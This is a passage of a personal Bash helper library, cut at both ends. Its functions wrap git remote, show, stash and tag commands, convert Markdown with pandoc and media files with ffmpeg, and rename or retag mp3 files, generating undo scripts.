    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    if [ -n "${arguments[${LBOUND}]}" ]; then
        git_repository="${arguments[${LBOUND}]}"
        print=false
    fi

    #--------------------------------------------------

    if [ "${print}" = true ]; then
        lremote
        return 0
    fi

    if [ "${git_ssh}" = true ]; then

        _echo_info "git remote \"${command}\" origin \"git@${git_server}:${git_username}/${git_repository}.git\"\n"
        git remote "${command}" origin "git@${git_server}:${git_username}/${git_repository}.git"
    else

        _echo_info "git remote \"${command}\" origin \"https://${git_server}/${git_username}/${git_repository}\"\n"
        git remote "${command}" origin "https://${git_server}/${git_username}/${git_repository}"
    fi

    lremote
}

## Print changes from given commit
function show() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'show (branch_name/commit_hash) -f [file path] -F [file type filter] -n [number] -B (pick branch) -C (pick commit) -l (list files only) -v (verbose) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local branch
    local command
    local commit_hash
    local file_path
    local filter
    local list_files_only=false
    local number
    local object
    local pick_branch=false
    local pick_commit=false
    local verbose=false

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :123456789BCf:F:ln:vh option; do
            case "${option}" in
                [1-9]) number="${option}";;
                B) pick_branch=true;;
                C) pick_commit=true;;
                f) file_path="${OPTARG}";;
                F) filter="${OPTARG}";;
                l) list_files_only=true;;
                n) number="${OPTARG}";;
                v) verbose=true;;
                h) _echo_warning 'show\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Print changes from given commit\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Validate and get arguments
    #--------------------------------------------------

    # Argument could be a branch name or a commit hash
    if [ -n "${arguments[${LBOUND}]}" ]; then
        object="${arguments[${LBOUND}]}"

        if [ "$(_branch_exists "${object}")" = true ]; then
            branch="${arguments[${LBOUND}]}"

        elif [ "$(_commit_exists "${object}")" = true ]; then
            commit_hash="${arguments[${LBOUND}]}"

        else
            _echo_danger "error: Invalid commit or branch name : \"${object}\"\n"
            _usage
            return 1
        fi
    fi

    #--------------------------------------------------
    # Iteractive pick
    #--------------------------------------------------

    # ignored when "branch" argument is set
    if [ "${pick_branch}" = true ] && [ -z "${branch}" ]; then
        branch="$(_pick_branch -m)"
    fi
    # shellcheck disable=2181
    if [ $? != 0 ]; then
        return 1
    fi

    # ignored when "commit hash" argument is set
    if [ "${pick_commit}" = true ] && [ -z "${commit_hash}" ]; then
        commit_hash=$(_pick_commit "${branch}")
    fi
    # shellcheck disable=2181
    if [ $? != 0 ]; then
        return 1
    fi

    #--------------------------------------------------
    # Validate values
    #--------------------------------------------------

    if [ -n "${number}" ]; then
        if [ "${number}" -lt 1 ] || [[ ! "${number}" =~ ^[0-9]+$ ]]; then
            _echo_danger 'error: "number" should be a positive integer\n'
            _usage
            return 1
        fi
    fi

    #--------------------------------------------------
    # Set default value
    #--------------------------------------------------

    if [ -z "${commit_hash}" ]; then
        commit_hash=HEAD
    fi

    #--------------------------------------------------
    # Build command
    #--------------------------------------------------

    if [ "${number}" -gt 1 ]; then
        if [ -n "${commit_hash}" ]; then
            commit_hash="${commit_hash}~$((number - 1))"
        fi
        if [ -n "${branch}" ]; then
            branch="${branch}~$((number - 1))"
        fi
    fi

    command='git show'

    #--------------------------------------------------
    # --diff-filter=ACMR
    # A: Added
    # C: Copied
    # D: Deleted
    # M: Modified
    # R: Renamed
    # U: Unmerged
    #--------------------------------------------------

    if [ "${list_files_only}" = true ]; then
        command="git --no-pager show --name-only --diff-filter=ACMR --pretty=''"
    fi

    if [ "${commit_hash}" != 'HEAD' ]; then
        command="${command} ${commit_hash}"

    elif [ -n "${branch}" ]; then
        command="${command} ${branch}"
    fi

    if [ -n "${filter}" ]; then
        command="${command} \"${filter}\""
    fi

    if [ -n "${file_path}" ]; then
        command="${command} -- \"${file_path}\""
    fi

    if [ "${list_files_only}" = true ]; then
        command="${command} | sort"
    fi

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    if [ "${verbose}" = true ]; then
        _echo_info "$(echo "${command}" | tr -s ' ')\n"
    fi

    eval "${command}"
}

## Manage stashed files
function stash() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'stash -A (all) -l (list) -s (show) -a (apply) -c (clear) -r (remove all) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local all=false
    local apply=false
    local clear=false
    local list=false
    local remove=false
    local show=false

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :Aaclrsh option; do
            case "${option}" in
                A) all=true;;
                a) apply=true;;
                c) clear=true;;
                l) list=true;;
                r) remove=true;;
                s) show=true;;
                h) _echo_warning 'stash\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Manage stashed files\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------
    # check git user configured
    #--------------------------------------------------

    if [ -z "$(git config --global user.username)" ] && [ -z "$(git config --global user.email)" ]; then
        _echo_danger 'error: Missing git default account identity\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -ne 0 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage

        return 1
    fi

    #--------------------------------------------------

    if [ "${apply}" = true ]; then
        _echo_info 'git stash apply\n'
        git stash apply

        return 0
    fi

    if [ "${list}" = true ]; then
        _echo_info 'git --no-pager stash list\n'
        git stash list

        return 0
    fi

    if [ "${show}" = true ]; then
        _echo_info 'git --no-pager stash show\n'
        git stash show

        return 0
    fi

    if [ "${all}" = true ] || [ "${remove}" = true ]; then
        _echo_info 'git add .\n'
        git add .
    fi

    if [ "${remove}" = true ]; then
        _echo_info 'git stash\n'
        git stash
    fi

    if [ "${clear}" = true ] || [ "${remove}" = true ]; then
        _echo_info 'git stash clear\n'
        git stash clear

        return 0
    fi

    _echo_info 'git stash\n'
    git stash
}

 
## Create, list or return latest tag
function tag() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'tag [tag] [-m message] -c (commit) -f (fetch) -l (list) -p (push) -d (delete) -D (delete remote) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local commit
    local delete=false
    local delete_remote=false
    local fetch=false
    local last_commit_message
    local list=false
    local message
    local push=false
    local tag

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :c:m::Ddflph option; do
            case "${option}" in
                c) commit="${OPTARG}";;
                m) message="${OPTARG}";;
                D) delete=true; delete_remote=true;;
                d) delete=true;;
                f) fetch=true;;
                l) list=true;;
                p) push=true;;
                h) _echo_warning 'tag\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Create, list or return latest tag\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # tag is the only valid argument
    tag="${arguments[${LBOUND}]}"

    #--------------------------------------------------

    last_commit_message=$(git log -1 --pretty=%B)

    # make sure we list all existing tags
    if [ -z "${tag}" ] || [ "${delete_remote}" = true ] || [ "${fetch}" = true ] || [ "${list}" = true ]; then
        fetch -t
    fi

    if [ -n "${tag}" ]; then
        # delete tag
        if [ "${delete}" = true ] || [ "${delete_remote}" = true ]; then
            if [ "${delete}" = true ]; then
                _echo_info "git tag --delete \"${tag}\"\n"
                git tag --delete "${tag}"
            fi

            # delete remote tag
            if [ "${delete_remote}" = true ]; then
                _echo_info "git push --delete origin \"${tag}\"\n"
                git push --delete origin "${tag}"
            fi
        else
            # set default message value
            if [ -z "${message}" ]; then
                if [ -n "${last_commit_message}" ]; then
                    message="${last_commit_message}"
                else
                    message=$(date -I)
                fi
            fi
            # create tag
            if [ -z "${commit}" ]; then
                _echo_info "git tag --force -a \"${tag}\" -m \"${message}\"\n"
                git tag --force -a "${tag}" -m "${message}"
            else
                _echo_info "git tag  --force -a \"${tag}\" -m \"${message}\" \"${commit}\"\n"
                git tag  --force -a "${tag}" -m "${message}" "${commit}"
            fi
        fi
    fi

    if [ -z "${tag}" ]; then
        if [ "${delete}" = true ] || [ "${delete_remote}" = true ]; then
            # delete all remote tags
            if [ "${delete_remote}" = true ]; then
                for tag in $(git tag);
                do
                    _echo_info "git push --delete origin \"${tag}\"\n"
                    git push --delete origin "${tag}"
                done
            fi

            # delete all local tags
            if [ "${delete}" = true ]; then
                for tag in $(git tag);
                do
                    _echo_info "git tag --delete \"${tag}\"\n"
                    git tag --delete "${tag}"
                done
            fi
        else
            # returns latest tag, fetch or list tags
            if [ "${list}" = true ]; then
                _echo_info 'git --no-pager tag --list\n'
                git --no-pager tag --list
            else
                # return latest tag
                _echo_info 'git describe --exact-match --abbrev=0\n'
                git describe --exact-match --abbrev=0
            fi
        fi
    fi

    # push all tags
    if [ "${push}" = true ]; then
        _echo_info 'git push --tags\n'
        git push --tags
    fi
}

## Convert Markdown to html or pdf format
function convert-md() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'convert-md [file/folder] -p (pdf) -r (recursive) -h (help)\n'
    }

    #--------------------------------------------------
    # Declare subfunction
    #--------------------------------------------------

    function _convert() {
        set -- "$1" "$(dirname "$1")/$(basename "$1" .md).${extension}"

        if [ "${extension}" = html ]; then
            _echo_info "pandoc \"$1\" --from gfm --to html --standalone --output \"$2\"\n"
            pandoc "$1" --from gfm --to html --standalone --output "$2"
            # set font to sans serif
            sed -i '14i\      font-family: sans-serif;' "$2"

            return 0
        fi

        _echo_info "pandoc \"$1\" --to pdf --output \"$2\"\n"
        pandoc "$1" --to pdf --output "$2"
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local extension=html
    local file_path
    local recursive=false

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :prh option; do
            case "${option}" in
                h) _echo_warning 'convert-md\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Convert Markdown to html or pdf format\n'
                    _usage 2 14
                    return 0;;
                p) extension=pdf;;
                r) recursive=true;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check convert installation
    #--------------------------------------------------

    if [ -z "$(command -v 'pandoc')" ]; then
        _echo_danger 'error: pandoc not installed, try "sudo apt-get install -y pandoc"\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # excluding last forward slash if any
    source="$(realpath "${arguments[${LBOUND}]}")"

    #--------------------------------------------------
    # Validate argument type
    #--------------------------------------------------

    # Check source validity
    if [ ! -f "${source}" ] && [ ! -d "${source}" ]; then
        _echo_danger "error: source: \"${source}\" is invalid\n"
        _usage 2 8

        return 1
    fi

    if [ ! -d "${source}" ] && [ "${recursive}" = true ]; then
        _echo_danger "error: source: \"${source}\" is not a valid directory\n"
        _usage 2 8

        return 1
    fi

    #--------------------------------------------------
    # Execute command
    #-------------------------------------------------

    if [ -d "${source}" ] && [ "${recursive}" = true ]; then
        find "${source}" -type f -name '*.md' | while read -r file_path; do
            _convert "${file_path}"
        done

        return 0
    fi

    if [ -d "${source}" ]; then
        find "${source}" -maxdepth 1 -type f -name '*.md' | while read -r file_path; do
            _convert "${file_path}"
        done

        return 0
    fi

    if [ -f "${source}" ]; then
        _convert "${source}"

        return 0
    fi

    _echo_danger "error: \"${source}\" is not a valid input\n"
    _usage 2 8
    return 1
}

## Convert audio or video to mp3
function convert-to-mp3() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'convert-to-mp3 [file/folder] -r (recursive) -h (help)\n'
    }

    #--------------------------------------------------
    # Declare subfunction
    #--------------------------------------------------

    function _convert() {
        # $1 = file_name

        local _BASENAME
        local CODEC
        local count
        local CURRENT_DIRECTORY
        local EXTENSION
        local NEW_PATH

        CODEC="$(ffprobe -v quiet -show_streams -select_streams a "$1" | grep '^codec_name=' | cut -d '=' -f2)"

        # check codec is valid
        if [ -z "${CODEC}" ]; then
            _echo_danger "error: cannot find valid codec for \"$1\"\n"
            echo "cannot find valid codec for \"$1\"" >> "${source}/error.log"

            return 0
        fi

        # check file codec
        if [ "${CODEC}" = 'mp3' ]; then
            _echo_warning "ignored : \"$1\" - already mp3 format\n"

            return 0
        fi

        # get extension including dot
        EXTENSION="$(echo "$1" | grep -oE '\.[a-zA-Z0-9]+$')"

        # get file base name without dot
        _BASENAME="$(basename "$1" "${EXTENSION}")"

        # get current directory excluding last forward slash
        CURRENT_DIRECTORY="$(realpath "$(dirname "$1")")"

        # generate new path
        NEW_PATH="${CURRENT_DIRECTORY}/${_BASENAME}.mp3"

        # no overwrite: append and increment suffix when file exists
        count=0
        while [ -f "${NEW_PATH}" ]; do
            ((count+=1))
            NEW_PATH="${CURRENT_DIRECTORY}/${_BASENAME}_${count}.mp3"
        done

        # -nostdin : avoid ffmpeg to swallow stdin
        _echo_info "ffmpeg -nostdin -hide_banner -i \"$1\" \"${NEW_PATH}\"\n"
        ffmpeg -nostdin -hide_banner -i "$1" "${NEW_PATH}"
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local file_path
    local recursive=false
    local source

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :rh option; do
            case "${option}" in
                r) recursive=true;;
                h) _echo_warning 'convert-to-mp3\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Convert audio or video to mp3\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check ffmpeg installation
    #--------------------------------------------------

    if [ -z "$(command -v 'ffmpeg')" ]; then
        _echo_danger 'error: ffmpeg not installed, try "sudo apt-get install -y ffmpeg"\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # excluding last forward slash if any
    source="$(realpath "${arguments[${LBOUND}]}")"

    #--------------------------------------------------
    # Validate argument type
    #--------------------------------------------------

    # Check source validity
    if [ ! -f "${source}" ] && [ ! -d "${source}" ]; then
        _echo_danger "error: source: \"${source}\" is invalid\n"
        _usage 2 8

        return 1
    fi

    if [ ! -d "${source}" ] && [ "${recursive}" = true ]; then
        _echo_danger "error: source: \"${source}\" is not a valid directory\n"
        _usage 2 8

        return 1
    fi

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    if [ -d "${source}" ] && [ "${recursive}" = true ]; then
        # Find all files recursively
        find "${source}" -type f -iregex ".+\.\(aac\|aiff\|flac\|m4a\|mp3\|ogg\|wav\|wma\|avi\|flv\|m2ts\|mkv\|mov\|mp4\|mts\|webm\|wmv\)" | while read -r file_path; do
            _convert "${file_path}"
        done

        return 0
    fi

    if [ -d "${source}" ]; then
        # Find all files recursively
        find "${source}" -maxdepth 1 -type f -iregex ".+\.\(aac\|aiff\|flac\|m4a\|mp3\|ogg\|wav\|wma\|avi\|flv\|m2ts\|mkv\|mov\|mp4\|mts\|webm\|wmv\)" | while read -r file_path; do
            _convert "${file_path}"
        done

        return 0
    fi

    if [ -f "${source}" ]; then
        _convert "${source}"

        return 0
    fi

    _echo_danger "error: \"${source}\" is not a valid input\n"
    _usage 2 8
    return 1
}

## Rename mp3 from id3 tag (creates undo script)
function mp3-rename-from-tag() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'mp3-rename-from-tag [folder] -a (%artist% - %title%) -d (%track%. %title%) -t (%track% %title%) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local artist_title=true
    local track_dot_title=false
    local track_title=false

    local count
    local current_directory
    local extension
    local file_path
    local new_basename
    local new_path
    local source

    local album
    local artist
    local note
    local title
    local track
    local year

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :adth option; do
            case "${option}" in
                a) artist_title=true;track_dot_title=false;track_title=false;;
                d) artist_title=false;track_dot_title=true;track_title=false;;
                t) artist_title=false;track_dot_title=false;track_title=true;;
                h) _echo_warning 'mp3-rename-from-tag\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Rename mp3 from id3 tag (creates undo script)\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check id3tool installation
    #--------------------------------------------------

    if [ -z "$(command -v 'id3tool')" ]; then
        _echo_danger 'error: id3tool not installed, try "sudo apt-get install -y id3tool"\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # excluding last forward slash if any
    source="$(realpath "${arguments[${LBOUND}]}")"

    #--------------------------------------------------
    # Validate argument type
    #--------------------------------------------------

    if [ ! -d "${source}" ]; then
        _echo_danger "error: \"${source}\" is not a valid directory\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    _echo_info "echo '#!/bin/bash' > \"${source}/mp3-rename-from-tag_undo.sh\"\n"
    echo '#!/bin/bash' > "${source}/mp3-rename-from-tag_undo.sh"

    # sort -t '\0' -n => sort output alphabetically
    find "${source}" -type f -name '*.mp3' | sort -t '\0' -n | while read -r file_path; do
        # get current directory excluding last forward slash
        current_directory="$(realpath "$(dirname "${file_path}")")"

        # get extension including dot
        extension="$(echo "${file_path}" | grep -oE '\.[a-zA-Z0-9]+$')"

        # get data from id3 tag
        TAG="$(id3tool "${file_path}")"
        artist="$(echo "${TAG}" | grep -E '^Artist:'     | sed -E 's/^Artist:\t\t//'   | sed -E 's/^ +//' | sed -E 's/ +$//' | tr -s ' ')"
        year="$(echo "${TAG}"   | grep -E '^Year:'       | sed -E 's/^Year:\t\t//'     | sed -E 's/^ +//' | sed -E 's/ +$//' | tr -s ' ')"
        album="$(echo "${TAG}"  | grep -E '^Album:'      | sed -E 's/^Album:\t\t//'    | sed -E 's/^ +//' | sed -E 's/ +$//' | tr -s ' ')"
        track="$(echo "${TAG}"  | grep -E '^Track:'      | sed -E 's/^Track:\t\t//'    | sed -E 's/^ +//' | sed -E 's/ +$//' | tr -s ' ')"
        title="$(echo "${TAG}"  | grep -E '^Song Title:' | sed -E 's/^Song Title:\t//' | sed -E 's/^ +//' | sed -E 's/ +$//' | tr -s ' ')"
        note="$(echo "${TAG}"   | grep -E '^Note:'       | sed -E 's/^Note:\t//'       | sed -E 's/^ +//' | sed -E 's/ +$//' | tr -s ' ')"

        _echo_warning "${artist} - ${year} ${album} - ${track}. ${title} - ${note}\n"

        if [ "${artist_title}" = true ]; then
            new_basename="$(printf '%s - %s' "${artist}" "${title}")"

        elif [ "${track_title}" = true ]; then
            new_basename="$(printf '%02d %s' "${track}" "${title}")"

        elif [ "${track_dot_title}" = true ]; then
            new_basename="$(printf '%02d. %s' "${track}" "${title}")"
        fi

        if [ -z "${new_basename}" ]; then
            _echo_info "could not retreive id3 tag from \"$(basename "${file_path}")\"\n"
            continue
        fi

        # generate new path
        new_path="${current_directory}/${new_basename}${extension}"
        # no overwrite: append and increment suffix when file exists
        count=0
        while [ -f "${new_path}" ]; do
            ((count+=1))
            new_path="${current_directory}/${new_basename}_${count}${extension}"
        done

        # rename file
        _echo_info "mv -nv \"${file_path}\" \"${new_path}\"\n"
        mv -nv "${file_path}" "${new_path}"

        # print undo
        printf 'mv -nv "%s" "%s"\n' "${new_path}" "${file_path}" >> "${source}/mp3-rename-from-tag_undo.sh"
    done
}

## Update mp3 tag from filename (creates undo script)
function mp3-update-tag() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'mp3-update-tag [folder] -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local _basename
    local file_path
    local source
    local tag

    local original_album
    local original_artist
    local original_title
    local original_track
    local original_year

    local album
    local artist
    local title
    local track
    local year

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :h option; do
            case "${option}" in
                h) _echo_warning 'mp3-update-tag\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Update mp3 tag from filename (creates undo script)\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check id3tool installation
    #--------------------------------------------------

    if [ -z "$(command -v 'id3tool')" ]; then
        _echo_danger 'error: id3tool not installed, try "sudo apt-get install -y id3tool"\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # excluding last forward slash if any
    source="$(realpath "${arguments[${LBOUND}]}")"

    #--------------------------------------------------
    # Validate argument type
    #--------------------------------------------------

    if [ ! -d "${source}" ]; then
        _echo_danger "error: \"${source}\" is not a valid directory\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    _echo_info "echo '#!/bin/bash' > \"${source}/mp3-update-tag_undo.sh\"\n"
    echo '#!/bin/bash' > "${source}/mp3-update-tag_undo.sh"

    # sort -t '\0' -n => sort output alphabetically
    find "${source}" -type f -name '*.mp3' | while read -r file_path; do

        # cache original tag (for undo)
        tag="$(id3tool "${file_path}")"

        original_album="$(echo "${tag}"  | grep -E '^Album:'      | sed -E 's/^Album:\t\t//'    | sed -E 's/^ +//' | sed -E 's/ +$//' | tr -s ' ')"
        original_artist="$(echo "${tag}" | grep -E '^Artist:'     | sed -E 's/^Artist:\t\t//'   | sed -E 's/^ +//' | sed -E 's/ +$//' | tr -s ' ')"
        original_title="$(echo "${tag}"  | grep -E '^Song Title:' | sed -E 's/^Song Title:\t//' | sed -E 's/^ +//' | sed -E 's/ +$//' | tr -s ' ')"
        original_track="$(echo "${tag}"  | grep -E '^Track:'      | sed -E 's/^Track:\t\t//'    | sed -E 's/^ +//' | sed -E 's/ +$//' | tr -s ' ')"
        original_year="$(echo "${tag}"   | grep -E '^Year:'       | sed -E 's/^Year:\t\t//'     | sed -E 's/^ +//' | sed -E 's/ +$//' | tr -s ' ')"

        # basename without extension
        _basename="$(basename "${file_path}" .mp3)"

        if [ -z "$(echo "${_basename}" | sed -E 's/^[0-9]+\. .+//')" ]; then
            # format is "Artist/Year Album/Track. Title.mp3"
            artist="$(basename "$(dirname "${source}")")"
            album="$(basename "${source}" | sed -E 's/^[0-9]+ +//')"
            year="$(basename "${source}" | grep -oE '^[0-9]+')"
            track="$(echo "${_basename}" | grep -oE '^[0-9]+')"
            title="$(echo "${_basename}" | sed -E 's/^[0-9]+\.? +//')"

            # update file tag
            _echo_info "id3tool --set-artist \"${artist}\" --set-album \"${album}\"  --set-year \"${year}\" --set-track \"${track}\" --set-title \"${title}\"  \"${file_path}\"\n"
            id3tool --set-artist "${artist}" --set-album "${album}"  --set-year "${year}" --set-track "${track}" --set-title "${title}"  "${file_path}"

        elif [ -z "$(echo "${_basename}" | sed -E 's/^.+ - .+//')" ]; then
            # format is "Artist - Title.mp3"
            # First part of the string before " - " delimiter is artist
            artist="$(echo "${_basename}" | sed -E 's/ - .+$//')"
            # Second part of the string after " - " delimiter is title
            title="$(echo "${_basename}"  | sed -E s/"^${artist} - "//)"

            # update file tag
            _echo_info "id3tool --set-title \"${title}\" --set-artist \"${artist}\" \"${file_path}\"\n"
            id3tool --set-title "${title}" --set-artist "${artist}" "${file_path}"
        fi

        # print undo
        printf 'id3tool --set-artist "%s" --set-album "%s" --set-year "%s" --set-track "%s" --set-title "%s" "%s"\n' "${original_artist}" "${original_album}" "${original_year}" "${original_track}" "${original_title}" "${file_path}" >> "${source}/mp3-update-tag_undo.sh"
    done
}

## Print image subject names from file exif data
function picture-get-names() {
    function _usage() {
